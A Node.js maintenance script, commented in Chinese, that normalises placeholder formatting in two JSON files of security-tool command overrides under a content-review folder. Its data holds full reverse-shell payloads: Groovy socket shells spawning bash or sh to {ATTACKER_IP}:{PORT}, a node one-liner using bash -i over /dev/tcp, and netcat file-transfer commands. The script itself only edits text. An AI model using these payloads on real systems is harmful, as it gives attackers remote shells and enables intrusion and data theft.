// 修复批次前置：把 tool-overrides.json 与 tool-overrides-governance-2026-09.json 中
// 4 处互相碰撞的 patch 值对齐到运行库终态（占位符规范化已直改库，文档滞后）。
// 对齐后这些 patch 进入"已应用"被过滤，不再互相撞 Duplicate tool override path。
// 从项目根运行：node scripts/review-fix-collision-align.mjs
import { readFileSync, writeFileSync } from 'node:fs';

const live = {
  'groovy-reverse|commands.0.command': 'String host=\\"{ATTACKER_IP}\\";\\nint port={PORT};\\nProcess p=new ProcessBuilder(\\"/bin/bash\\",\\"-i\\").redirectErrorStream(true).start();\\nSocket s=new Socket(host,port);\\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\\nwhile(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception ignored){}}\\np.destroy();s.close();',
  'groovy-reverse|commands.2.command': 'String host=\\"{ATTACKER_IP}\\";\\nint port={PORT};\\nProcess p=new ProcessBuilder(\\"/bin/sh\\",\\"-i\\").redirectErrorStream(true).start();\\nSocket s=new Socket(host,port);\\nInputStream pi=p.getInputStream(),si=s.getInputStream();\\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\\nwhile(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception ignored){}}\\np.destroy();s.close();',
  'nodejs-reverse|commands.2.command': 'node -e \\"require(\'child_process\').spawn(\'/bin/bash\',[\'-c\',\'bash -i >& /dev/tcp/{ATTACKER_IP}/{PORT} 0>&1\'])\\"',
  'nc-reverse|commands.3.command': 'nc -lvnp {PORT} < file\\nnc ATTACKER_IP PORT > file',
};

// 旧值以"文件内 JSON 字符串字面量的内部内容"表示（不含首尾引号）
const oldInFile = {
  'tool-overrides.json': {
    'groovy-reverse|commands.0.command': 'String host=\\"ATTACKER_IP\\";\\nint port=PORT;\\nProcess p=new ProcessBuilder(\\"/bin/bash\\",\\"-i\\").redirectErrorStream(true).start();\\nSocket s=new Socket(host,port);\\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\\nwhile(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception ignored){}}\\np.destroy();s.close();',
    'groovy-reverse|commands.2.command': 'String host=\\"ATTACKER_IP\\";\\nint port=PORT;\\nProcess p=new ProcessBuilder(\\"/bin/sh\\",\\"-i\\").redirectErrorStream(true).start();\\nSocket s=new Socket(host,port);\\nInputStream pi=p.getInputStream(),si=s.getInputStream();\\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\\nwhile(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception ignored){}}\\np.destroy();s.close();',
    'nodejs-reverse|commands.2.command': 'node -e \\"require(\'child_process\').spawn(\'/bin/bash\',[\'-c\',\'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\'])\\"',
    'nc-reverse|commands.3.command': 'nc -lvnp PORT < file\\nnc ATTACKER_IP PORT > file',
  },
  'tool-overrides-governance-2026-09.json': {
    'groovy-reverse|commands.0.command': 'String host=\\"{ATTACKER_IP}\\";\\nint port=PORT;\\nProcess p=new ProcessBuilder(\\"/bin/bash\\",\\"-i\\").redirectErrorStream(true).start();\\nSocket s=new Socket(host,port);\\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\\nwhile(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception ignored){}}\\np.destroy();s.close();',
    'groovy-reverse|commands.2.command': 'String host=\\"{ATTACKER_IP}\\";\\nint port=PORT;\\nProcess p=new ProcessBuilder(\\"/bin/sh\\",\\"-i\\").redirectErrorStream(true).start();\\nSocket s=new Socket(host,port);\\nInputStream pi=p.getInputStream(),si=s.getInputStream();\\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\\nwhile(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception ignored){}}\\np.destroy();s.close();',
    'nodejs-reverse|commands.2.command': 'node -e \\"require(\'child_process\').spawn(\'/bin/bash\',[\'-c\',\'bash -i >& /dev/tcp/{ATTACKER_IP}/PORT 0>&1\'])\\"',
    'nc-reverse|commands.3.command': 'nc -lvnp PORT < file\\nnc {ATTACKER_IP} PORT > file',
  },
};

for (const [file, mapping] of Object.entries(oldInFile)) {
  const path = `content-review/${file}`;
  let raw = readFileSync(path, 'utf8');
  for (const [key, oldValue] of Object.entries(mapping)) {
    const newValue = live[key];
    const hits = raw.split(oldValue).length - 1;
    if (hits !== 1) {
      throw new Error(`${file} ${key}: 期望恰好 1 处命中，实际 ${hits} 处，放弃写盘`);
    }
    raw = raw.replace(oldValue, newValue);
    console.log(`aligned: ${file} ${key}`);
  }
  writeFileSync(path, raw, 'utf8');
}
console.log('done');
